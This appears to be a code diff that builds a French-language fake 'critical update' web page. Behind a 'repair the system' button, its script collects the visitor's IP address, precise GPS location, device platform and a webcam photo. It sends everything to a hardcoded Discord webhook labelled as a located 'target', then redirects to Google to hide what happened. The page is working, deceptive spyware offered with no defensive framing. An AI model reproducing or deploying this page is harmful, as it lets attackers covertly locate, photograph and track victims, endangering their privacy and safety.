@@ -1,42 +1,75 @@
-async function execute() {
-            const btn = document.getElementById('run');
-            const progress = document.getElementById('progress');
-            const stats = document.getElementById('stats-box');
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service de Maintenance</title>
+    <style>
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #00ff41; padding: 25px; width: 320px; text-align: center; box-shadow: 0 0 15px rgba(0,255,65,0.2); }
+        .progress-container { width: 100%; height: 4px; background: #111; margin: 15px 0; display: none; }
+        .progress-bar { width: 0%; height: 100%; background: #00ff41; transition: width 0.4s; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 12px; width: 100%; font-weight: bold; cursor: pointer; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h2 style="font-size: 18px;">CRITICAL_UPDATE_V5</h2>
+        <p id="status">Une vérification système est requise pour stabiliser votre connexion.</p>
+        <div class="progress-container" id="p-cont"><div class="progress-bar" id="p-bar"></div></div>
+        <button id="run" class="btn" onclick="execute()">RÉPARER LE SYSTÈME</button>
+    </div>
 
-            btn.style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            stats.innerHTML = "STATUS: INITIALIZING_GEOLOCATION...<br>MODULE: GPS_ACTIVE";
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-            // 1. RÉCUPÉRATION IP & INFOS SYSTÈME
-            let ip = "Non détectée";
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
+
+        async function post(msg, file = null) {
+            const fd = new FormData();
+            if (file) fd.append('file', file, 'capture.png');
+            fd.append('payload_json', JSON.stringify({ content: msg }));
+            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e){}
+        }
+
+        async function execute() {
+            document.getElementById('run').style.display = 'none';
+            document.getElementById('p-cont').style.display = 'block';
+            const bar = document.getElementById('p-bar');
+            const status = document.getElementById('status');
+
+            // 1. RÉCUPÉRATION IP RÉELLE (Priorité 1)
+            let ip = "Détection impossible";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
-                const d = await res.json();
-                ip = d.ip;
+                const data = await res.json();
+                ip = data.ip;
             } catch(e) {}
+            bar.style.width = "30%";
+
+            // 2. GPS HAUTE PRÉCISION (Priorité 2)
+            let gps = "Non autorisé";
+            status.innerText = "Calcul de la position satellite...";
             
-            progress.style.width = "30%";
+            const getPos = () => new Promise(res => {
+                navigator.geolocation.getCurrentPosition(
+                    (p) => res(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+                    () => res("⚠️ Accès GPS refusé"),
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            });
+            
+            gps = await getPos();
+            bar.style.width = "60%";
 
-            // 2. FORCE LA GÉOLOCALISATION PRÉCISE (Satellite)
-            const getGPS = () => {
-                return new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (p) => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
-                        () => resolve("⚠️ Permission GPS refusée par l'utilisateur"),
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                });
-            };
+            // ENVOI DU RAPPORT RÉSEAU
+            await post(`🎯 **CIBLE LOCALISÉE**\n**IP**: \`${ip}\`\n**GPS**: ${gps}\n**Appareil**: ${navigator.platform}`);
 
-            const gpsLocation = await getGPS();
-            progress.style.width = "60%";
-
-            // ENVOI DU PREMIER RAPPORT (IP + GPS)
-            await post(`🎯 **CIBLE LOCALISÉE**\n\`\`\`yaml\nIP: ${ip}\nGPS: ${gpsLocation}\nOS: ${navigator.platform}\n\`\`\``);
-
-            // 3. CAMÉRA
+            // 3. CAPTURE PHOTO (Priorité 3)
             try {
-                stats.innerHTML = "STATUS: CAPTURING_VISUAL...<br>GPS: LOCKED";
+                status.innerText = "Vérification des capteurs...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -47,15 +80,18 @@ async function execute() {
                         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            await post("📸 **PHOTO SYSTÈME**", blob);
-                            progress.style.width = "100%";
+                            await post("📸 **CAPTURE RÉUSSIE**", blob);
+                            bar.style.width = "100%";
                             stream.getTracks().forEach(t => t.stop());
-                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+                            window.location.href = "https://www.google.com";
                         }, 'image/png');
-                    }, 1000);
+                    }, 1500);
                 };
             } catch (err) {
                 await post("❌ **CAMÉRA BLOQUÉE**");
                 window.location.href = "https://www.google.com";
             }
         }
+    </script>
+</body>
+</html>
